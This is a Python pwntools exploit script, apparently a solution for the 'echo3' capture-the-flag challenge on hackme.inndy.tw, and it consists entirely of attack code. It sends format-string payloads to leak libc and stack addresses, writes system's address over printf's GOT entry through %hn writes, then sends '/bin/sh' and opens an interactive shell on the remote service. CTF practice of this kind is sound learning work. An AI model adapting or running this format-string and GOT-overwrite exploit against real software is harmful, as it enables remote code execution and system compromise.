from pwn import *
import time
#context(log_level = "debug")

elf = ELF('./echo3')
libc = ELF('./libc-2.23.so.i386')

printf_got = elf.got['printf']

while True:
	#t = process('./echo3', env = {"LD_PRELOAD": "./libc-2.23.so.i386"})
	t = remote('hackme.inndy.tw', 7720)
	payload = '%51$p.%14$p'
	t.sendline(payload)
	libc_start_main = t.recvuntil('.', drop = True)
	if libc_start_main[-3:] == '637':
		break
	t.close


libc_base = int(libc_start_main, 16) - libc.symbols['__libc_start_main'] - 0xf7
stack_base = int(t.recvuntil('\n', drop = True), 16) - 0x10
log.info('libc_base   %x', libc_base)
log.info('stack_base  %x', stack_base)
payload = '%' + str((stack_base + 0x2c) & 0xffff) + 'c%38$hn'
payload += '%' + str( ((stack_base + 0x4c) & 0xffff) - ((stack_base + 0x2c) & 0xffff)) + 'c%39$hn'
t.sendline(payload)
sleep(1)
payload = '%' + str(printf_got & 0xffff) + 'c%93$hn'
payload += '%' + str(((printf_got + 2) & 0xffff ) - (printf_got & 0xffff)) + 'c%95$hn'
t.sendline(payload)
sleep(1)
system = libc_base + libc.symbols['system']

payload = '%' + str(system & 0xffff) + 'c%19$hn'
payload += '%' + str((system & 0xffff) - ((system >> 16) & 0xffff)) + 'c%11$hn'
t.sendline(payload)
sleep(1)
t.sendline('/bin/sh\x00')
t.interactive()


